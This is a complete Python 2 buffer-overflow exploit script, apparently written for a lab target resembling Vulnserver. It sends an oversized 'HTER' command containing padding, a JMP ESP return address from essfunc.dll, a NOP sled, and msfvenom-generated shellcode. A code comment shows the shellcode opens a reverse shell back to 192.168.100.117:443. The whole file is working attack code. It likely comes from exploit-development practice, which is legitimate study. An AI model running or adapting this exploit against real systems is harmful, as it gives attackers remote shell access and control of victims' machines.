import socket
import os
import sys

host = "192.168.100.118"
port = 9999

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.100.117 lport=443 -f hex EXITFUNC=thread -b "\x00"
# 702 bytes
shellcode = ("dbd7d97424f4bd45fafa4c5a2bc9b15283c204316a13032fe918b953e55f42abf63fca4ec77fa81b78b0ba49753bee790e49278ea7e411a1385461a0baa7b6028267cb43c39a26119cd19585a9ac252ee1212ed3b2401f42c81abf651d17f67d421240f6b0e853de8811ff1f25e00158821b7490f0a68f678a7c05732cf6bd5fccdb5814c2902f72c727e309f3ac02dd75f620f9deac4958bb0375ba64fbd3b189e86998c5dd4322164ad35124d54ffd049e49fa6bb52e9495364fbd51621fd5700bf4257cde5b75d2b11b259261f42f1d5de450f7f68fab9038e7d715d1fa17d79a72f1bdccd2aa29747f20cb79554dcbf25ab282f217a073f36d9ad20c58b2b99f0742b7839f159072d6f30c2c40e1cca8aba10a093528de35113a26b51d6ef6e0cbd8b05abab26a301452ea7aa724f35651c8420f24f76bc7a08091774e5b1297ad496f306818d25d8bf7115808fde99f1074efe496659d757389327556")

buffer  = 'A' * 2041
buffer += 'BB115062' # 0x625011BB - JMP ESP from essfunc.dll
buffer += '90' * 20
buffer += shellcode
buffer += 'C' * (3000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("HTER " + buffer)
print s.recv(1024)
s.close()
